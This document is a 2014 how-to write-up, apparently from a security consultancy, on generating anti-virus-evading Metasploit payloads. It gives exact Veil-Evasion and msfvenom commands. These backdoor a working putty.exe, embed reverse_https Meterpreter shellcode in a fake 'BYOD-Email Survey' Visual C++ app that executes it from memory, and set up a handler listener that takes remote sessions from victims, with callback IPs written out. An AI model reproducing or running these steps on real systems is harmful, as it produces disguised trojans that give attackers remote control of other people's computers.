# AV Evading Payload Generation
## CyanLine LLC &copy; 2014 All Rights Reserved
## Description of the payload generation processes
### <sb@cyanline.com>
### <cory@cyanline.com>

## Table of Contents
1. Introduction
2. Veil payload generation
3. Evil putty payload generation
4. BYOD-Email Survey payload generation
5. Payload listener configuration
6. Resources

***

## 1. Introduction
This document is a writeup which covers various methods to generate Metasploit payloads that bypass common anti-virus (AV) solutions. There are 3 searate options that we tried.
+ Veil executable for payload generation
+ Attach malware to an existing executable
+ Generate raw shell code in Metasploit and import that into a custom executable

Each method follows a similar architecture which is made up of the following components.

+ a functioning executable (.exe)
+ an executable-backdooring payload
+ and a Metasploit server for catching incoming sessions. 

The methods covered in this document use Metasploit to listen for incoming connections, generate the payload shellcode, and bind the payload shellcode to an existing executable without breaking its functionality. 

The majority of steps outlined in this document take place in a GNU/Linux OS command line. The use of Kali Linux is strongly recommended as all dependencies for Metasploit and Veil are pre-installed. Although another GNU/Linux distribution can work.
***

## 2. Veil payload generation
The Veil-Evasion tool uses new techniques to generate a payload backdoored executable. Start here: <https://www.veil-framework.com/> for overview. The new techniques were implemented after performing research on the short comings of Metasploit to evade AV. 
The Veil framework is best used in Kali (x86) as all dependencies are pre-installed. 
The Veil framework does not require that you provide an executable, or executable template, the framework provides this for you. 
Perform the following steps to generate your own veil exe. 

1. Get yourself booted into a Kali instance - <http://www.kali.org/downloads/>, <http://docs.kali.org/category/installation>.
2. Once in kali command line, clone the source code - run the following command.

    `git clone https://github.com/Veil-Framework/Veil.git`
3. Update the source - run the following commands. 

    `cd Veil`

    `./update.sh`
4. Next, you'll be prompted twice to update/download dependency requirements. Enter 'Y' and hit the Enter button.
5. Follow the on screen instructions in the Setup Wizard GUI window that will pop up, in order to install all the required python dependencies. Leave all the defaults in the installation wizard, just keep pressing next. 
6. Start the framework - run the following commands.

    `cd Veil-Evasion/`

    `./Veil-Evasion.py`
7. Once inside the framework, I entered the following commands to produce my undetectable exe

    `list`

    `16`

    `set LHOST 54.197.139.176 # my aws instance w metasploit handler listner`

    `set LPORT 443`

    `info` # double check the desired settings

    `generate`

    `evil` # base name for executable , can be anything 

    `1` # since we are in linux, not windows
8. Next, the exe will generate, watch closely for errors. 
9. Exit the framework - enter the following commands:

    `[enter]`

    `exit` # to leave
10. Once back at the bash command prompt, collect the newly generated exe - enter the following commands.

    `cd`

    `cd veil-output/compiled/`

    `ls` # you should see evil.exe if there were no errors

***
## 3. Evil putty payload
Perform the following steps to generate an infected putty executable.

1. Install Metasploit
2. Download putty by running the following command:

    `wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe`
3. Next, we will generate the reverse\_https metasploit payload, encode it 25 times using shikata\_ga\_nai, set the listener IP address and port, and generate our evil payload 'evilputty.exe' from our original payload 'putty.exe' all without breaking the functionality of the original by using the `-x` flag. 

    `msfvenom -p windows/meterpreter/reverse_https -f exe -e x86/shikata_ga_nai -i 25 -k -x /var/www/lulz/putty.exe LHOST=192.168.1.41 LPORT=443 >evilputty.exe`

    Where "/var/www/lulz/" is the `path` to your putty executable.

## 4. BYOD-Email Survey payload
For this method, we generated shellcode using Metasploit. That was then imported into a visual c++ program. Perform the following steps to generate a custom Metasploit infected executable. 

1. Download and install Microsoft Visual Studio Professional 2013.
2. Select `New Project`.
3. In the `New Project` setup wizard, select `C++` in the left hand pane.
4. Select `MFC` in the sub category.
5. In the pane on the right, select `MFC Application`.
6. Input the `Project Name` and `Solution Name`.
7. Select `OK`.
8. Select `Next`.
9. On the `Application Type` phase, select `Dialog Based`.
10. Select `Use MFC in a static library`.
11. In the `Solution Explorer` pane, select `<your-project-name>.cpp`.
12. Next, we will use Metasploit to output shellcode in `C`. On a GNU/Linux OS with Metasploit installed, run the following command.

    `msfvenom -p windows/meterpreter/reverse_https LHOST=111.222.333.444 LPORT=443 -f c`

13. Copy the output shellcode.
14. Return to the Visual Studio editor.
15. Create a function and paste your shellcode into your function. An example is below.

    `void own() {`

    `unsigned char buf[] =`

    `"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"`

    `...(paste your shellcode here...`

    `"\x37\x2e\x31\x33\x39\x2e\x31\x37\x36\x00";`

    `void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);`

    `memcpy(exec, buf, sizeof buf);`

    `((void(*)())exec)();`

    `}`

16. Create a call to the function somewhere in your application.

    `own();`
17. Compile your application and run it. 
***
## 5. Payload listener configuration
Perform the following steps to configure the payload listener , or your "Phone-home" system. 

1. Install Metasploit
2. Open the Metasploit console.

    `msfconsole`
3. Run 

    `use exploit/multi/handler`

    `set payload windows/meterpreter/reverse_https`

    `set lport 443`

    `set lhost 111.222.333.444`

    `set ExitOnSession false`

    `exploit -j -z`
4. Wait for incoming connection (session)
5. Connect to incoming session.

    `sessions -i 1` # 1 = session no. 

***
## 6. Resources
Misc resources. 

1. <http://realhackerspoint.blogspot.com/2013/02/create-virus-that-bypasses-antivirus.html/>
2. <http://www.digitalthreat.net/2012/02/anti-virus-evasion-using-custom-shellcode/>

***
